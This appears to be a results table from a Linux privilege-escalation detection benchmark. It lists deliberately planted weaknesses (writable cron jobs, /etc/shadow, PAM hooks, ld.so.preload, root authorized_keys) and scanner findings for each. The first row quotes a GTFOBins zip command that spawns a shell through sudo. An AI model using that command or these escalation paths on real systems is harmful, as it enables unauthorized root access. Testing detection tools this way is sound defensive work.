| `suid-zip` | 2431 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/zip [non-standard] \| [+] gtfobins found: \| - TF=$(mktemp -u) \| - sudo zip $TF /etc/hosts -T -TT 'sh #' \| - sudo rm $TF \| [+] system calls found: \| - mf |
| `wildcard-cron` | 2226 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] \| /opt/bench/wildcard [writable] |
| `writable-anacrontab` | 2270 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /opt/bench/anacron-hook.sh [writable] \| path: /etc/anacrontab [writable] \| /opt/bench/anacron-hook.sh [writable] |
| `writable-apache-config` | 2278 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/apache2/conf-available/bench.conf [writable] \| path: /opt/bench/apache-hook.sh [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-gen |
| `writable-bashrc` | 2190 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /root/.bashrc [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] |
| `writable-cron-allow` | 2249 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/cron.d/bench-cronjob \| subfiles: \| - [writable: /opt/bench/cronjob] => * * * * * root /opt/bench/cronjob \| path: /opt/bench/cronjob [writable] \| path |
| `writable-cron-d` | 2256 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/cron.d/bench-writable [writable] \| subfiles: \| - [writable: /opt/bench/cron-d-job] => * * * * * root /opt/bench/cron-d-job \| path: /opt/bench/cron-d- |
| `writable-cron-ref` | 2186 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /opt/bench/cronroot.sh [writable] \| path: /etc/crontab \| subfiles: \| - [writable: /opt/bench/cronroot.sh] => * * * * * root /opt/bench/cronroot.sh \| /opt/ |
| `writable-crontab` | 2216 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/cron.d/bench-job \| subfiles: \| - [writable: /opt/bench/job.sh] => * * * * * root /opt/bench/job.sh \| path: /opt/bench/job.sh [writable] \| path: /etc/ |
| `writable-crontab-system` | 2271 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /opt/bench/system-cron-job [writable] \| path: /etc/crontab [writable] \| subfiles: \| - [writable: /opt/bench/system-cron-job] => * * * * * root /opt/bench/ |
| `writable-environment` | 2437 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/init.d/cron \| subfiles: \| - [writable: /etc/environment] => for ENV_FILE in /etc/environment /etc/default/locale; do \| - [writable: /etc/environment] |
| `writable-etc-hosts` | 2336 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /opt/bench/hosts-hook.sh [writable] \| path: /etc/hosts [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] \| /opt/benc |
| `writable-exports` | 2187 | nfs | **Yes** | nfs_root_squashing (verified 2026-07-25 on 10.10.1.109) — no_root_squash directive found |
| `writable-init-d` | 2253 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/init.d/benchsvc [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] |
| `writable-ld-so-conf` | 2235 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/ld.so.conf.d/bench.conf [writable] \| subfiles: \| - [writable: /usr/local/lib/benchevil] => /usr/local/lib/benchevil \| path: /usr/local/lib/benchevil/ |
| `writable-ld-so-preload` | 2182 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/ld.so.preload [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] |
| `writable-lib` | 2237 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /usr/local/lib/benchhijack/payload.so [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] \| /usr/local/lib/benchhijack |
| `writable-logrotate-d` | 2338 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/logrotate.d/bench2 [writable] \| subfiles: \| - [writable: /opt/bench/logrotate2-hook.sh] => /opt/bench/logrotate2-hook.sh \| - directory: /opt/bench [w |
| `writable-motd` | 2243 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/update-motd.d/99-bench [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] |
| `writable-nginx-config` | 2284 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/nginx/conf.d/bench.conf [writable] \| path: /opt/bench/nginx-hook.sh [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [wri |
| `writable-pam` | 2258 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/pam.d/bench-hook [writable] \| subfiles: \| - [writable: /opt/bench/pam-exec.sh] => auth optional pam_exec.so /opt/bench/pam-exec.sh \| path: /opt/bench |
| `writable-passwd` | 2217 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/passwd [writable] |
| `writable-profile` | 2188 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/profile.d/bench-hook.sh [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] |
| `writable-rc-local` | 2264 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/rc.local [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] |
| `writable-root-ssh` | 2229 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /root/.ssh/authorized_keys [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] |
| `writable-rsyslog` | 2337 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/rsyslog.d/bench.conf [writable] \| path: /opt/bench/rsyslog-hook.sh [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writ |
| `writable-shadow` | 2174 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/shadow [writable] |
| `writable-shm-hook` | 2386 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/cron.d/bench-shm \| subfiles: \| - [writable: /dev/shm/bench/hook.sh] => * * * * * root /bin/sh /dev/shm/bench/hook.sh \| - directory: /dev/shm/bench [w |
| `writable-sshd-config` | 2257 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/ssh/sshd_config.d/99-bench.conf [writable] \| path: /opt/bench/sshd-hook.sh [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generat |
| `writable-sudoers` | 2175 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /opt/bench/sudoers.pending [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] \| /opt/bench/sudoers.pending [writable] |
| `writable-supervisor` | 2311 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/supervisor/conf.d/bench.conf [writable] \| path: /opt/bench/supervisor-hook.sh [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-gene |
| `writable-systemd-dropin` | 2313 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/systemd/system/bench.service.d/override.conf [writable] \| path: /opt/bench/systemd-hook.sh [writable] \| path: /etc/systemd/system-generators/systemd- |
| `writable-tmp-hook` | 2395 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/cron.d/bench-tmp \| subfiles: \| - [writable: /tmp/bench/hook.sh] => * * * * * root /bin/sh /tmp/bench/hook.sh \| - directory: /tmp/bench [writable] \| p |
| `writable-udev-rules` | 2312 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/udev/rules.d/99-bench.rules [writable] \| path: /opt/bench/udev-hook.sh [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [ |
| `writable-vpn-hook` | 2266 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/openvpn/client/up.sh [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] |
| `writable-webroot` | 2262 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /var/www/bench/pwn.php [writable] \| path: /etc/systemd/system-generators/systemd-gpt-auto-generator [writable] |
